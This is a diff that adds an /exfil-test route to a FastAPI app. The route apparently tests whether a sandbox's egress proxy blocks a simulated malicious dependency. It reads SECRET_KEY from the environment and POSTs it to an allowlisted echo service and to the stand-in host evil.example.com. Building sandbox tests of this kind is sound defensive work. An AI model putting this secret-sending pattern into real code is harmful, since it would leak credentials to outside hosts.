@@ -33,6 +33,36 @@ def read_root():
         "internet_status": internet_status,
     }
 
+
+@app.get("/exfil-test")
+def exfil_test():
+    """Simulates a malicious dependency trying to phone SECRET_KEY home.
+
+    Run with --allow-env --allow-net-out=postman-echo.com and hit this route:
+    the postman-echo.com POST should succeed (it's allowlisted), the
+    evil.example.com POST should get blocked by sbox's egress proxy even
+    though network egress is on and the secret is in env.
+    """
+    secret = os.getenv("SECRET_KEY", "NOT_SET")
+    targets = {
+        "allowed (postman-echo.com)": "http://postman-echo.com/post",
+        "blocked (evil.example.com)": "http://evil.example.com/collect",
+    }
+    results = {}
+    for label, url in targets.items():
+        try:
+            req = urllib.request.Request(
+                url,
+                data=f"secret={secret}".encode(),
+                headers={"User-Agent": "Mozilla/5.0"},
+            )
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                results[label] = f"EXFILTRATED (HTTP {resp.status})"
+        except Exception as e:
+            results[label] = f"blocked: {e}"
+    return results
+
+
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="127.0.0.1", port=8000)
